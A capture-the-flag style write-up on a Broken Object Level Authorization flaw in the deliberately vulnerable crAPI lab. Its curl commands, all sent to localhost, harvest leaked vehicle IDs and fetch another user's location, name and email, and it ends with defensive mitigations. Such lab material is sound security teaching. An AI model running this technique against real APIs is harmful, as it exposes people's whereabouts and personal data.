# Challenge 1 — Broken Object Level Authorization (BOLA)

## Goal

Access sensitive details of another user's vehicle.

## What is wrong

The vehicle location endpoint only checks that the request has a valid bearer token, but it does **not** verify that the authenticated user owns the `vehicleId` in the path. As a result, any authenticated user can retrieve the location, full name, and email of any vehicle owner as long as they know the vehicle UUID.

## Attack flow

1. Sign up as a new user and log in.
2. Add a vehicle (by requesting the email with VIN/pincode and then calling `add_vehicle`).
3. List recent community posts. The `author` object in each post leaks the author's `vehicleid`.
4. Call `GET /identity/api/v2/vehicle/{vehicleId}/location` with a victim's `vehicleid`.

## Reproduction

### 1. Sign up and log in

```bash
curl -s -X POST http://127.0.0.1:8888/identity/api/auth/signup \
  -H "Content-Type: application/json" \
  -d '{"email":"alice@example.com","name":"Alice","number":"5551234567","password":"Test!12345"}'

curl -s -X POST http://127.0.0.1:8888/identity/api/auth/login \
  -H "Content-Type: application/json" \
  -d '{"email":"alice@example.com","password":"Test!12345"}' > /tmp/login.json

TOKEN=$(jq -r .token /tmp/login.json)
```

### 2. Get vehicle credentials from MailHog

```bash
curl -s -X POST http://127.0.0.1:8888/identity/api/v2/vehicle/resend_email \
  -H "Authorization: Bearer $TOKEN"
```

Open `http://127.0.0.1:8025` or query the API for the email and extract the VIN and pincode.

### 3. Add the vehicle

```bash
curl -s -X POST http://127.0.0.1:8888/identity/api/v2/vehicle/add_vehicle \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer $TOKEN" \
  -d '{"pincode":"8688","vin":"W3H990J69980KB13J"}'
```

### 4. Find another user's vehicle ID

The `/community/api/v2/community/posts/recent` endpoint exposes each author's `vehicleid`:

```bash
curl -s -X GET 'http://127.0.0.1:8888/community/api/v2/community/posts/recent?limit=10' \
  -H "Authorization: Bearer $TOKEN"
```

Example response (truncated):

```json
{
  "posts": [
    {
      "author": {
        "nickname": "Adam",
        "email": "adam007@example.com",
        "vehicleid": "f89b5f21-7829-45cb-a650-299a61090378"
      }
    }
  ]
}
```

### 5. Access the victim's vehicle location

```bash
curl -s -X GET http://127.0.0.1:8888/identity/api/v2/vehicle/f89b5f21-7829-45cb-a650-299a61090378/location \
  -H "Authorization: Bearer $TOKEN"
```

Response:

```json
{
  "carId": "f89b5f21-7829-45cb-a650-299a61090378",
  "vehicleLocation": {
    "id": 1,
    "latitude": "32.778889",
    "longitude": "-91.919243"
  },
  "fullName": "Adam",
  "email": "adam007@example.com"
}
```

## Impact

Any user can track the real-world location and PII of any other crAPI user once the vehicle UUID is known. The UUIDs are not sequential, but they are leaked through the community forum, making enumeration trivial.

## Defensive mitigations

1. **Ownership checks** on every object-level endpoint. `GET /identity/api/v2/vehicle/{vehicleId}/location` should verify that `vehicleId` belongs to the authenticated user.
2. **Do not expose internal object IDs** (`vehicleid`) in public responses. The community post author object should not include the vehicle UUID.
3. **Use indirect reference maps** if public identifiers are needed (e.g. a short, random alias instead of a UUID).
4. **WAAP / API gateway** rules:
   - Rate-limit repeated `GET /.../location/{id}` calls with rotating IDs.
   - Alert on requests where the authenticated user has never interacted with the object ID before.
